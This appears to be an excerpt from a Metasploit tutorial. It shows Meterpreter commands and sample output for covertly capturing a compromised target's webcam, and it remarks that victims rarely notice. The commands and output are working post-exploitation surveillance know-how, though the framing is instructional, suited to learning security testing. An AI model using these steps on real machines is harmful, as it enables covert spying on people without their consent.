    # Capturing Webcam Video, Screenshots and Sound


    When I was listening to the news a while back I remember them they going on and
    on about a brand new "advanced persistent threat" that could actually allow attackers
    to turn on your webcam and even record sound. I thought this was completely ridiculous
    as you have been able to do this with Metasploit for years.


    # WEBCAM VIDEO


    From the Metasploit shell, typing "run webcam -h" displays the help menu.


    ```

    meterpreter > run webcam -h

    webcam -- view webcam over session


    OPTIONS:

    -d <opt> Loop delay interval (in ms, default 1000)

    -f Just grab single frame

    -g Send to GUI instead of writing to file

    -h Help menu

    -i <opt> The image of the webcam to use (Default: 1)

    -l <opt> Capturing in a loop (default)

    -p <opt> The path to the folder Images will be saved in (Default: current working
    directory)

    -q <opt> The JPEG image quality (Default: 50)

    -s <opt> Stop recording

    ```


    Then type "run webcam" and add any options that you want. This will remotely display
    the webcam from the target system.


    ```

    meterpreter > run webcam -l

    [*] Starting webcam 1: HP Webcam-101

    [*] View stream at: ./webcam.htm

    [*] Image saved to: ./webcam.jpg

    ^C[*] Stopping webcam

    ```


    If you use the "-F" option it will continuously grab webcam snaps until you hit
    "CNTR-C".


    The only hint you get on the target machine that something is wrong is that your
    webcam-recording light (if yours has one) comes on. Other than that, you cannot
    tell that someone is remotely viewing your webcam.'
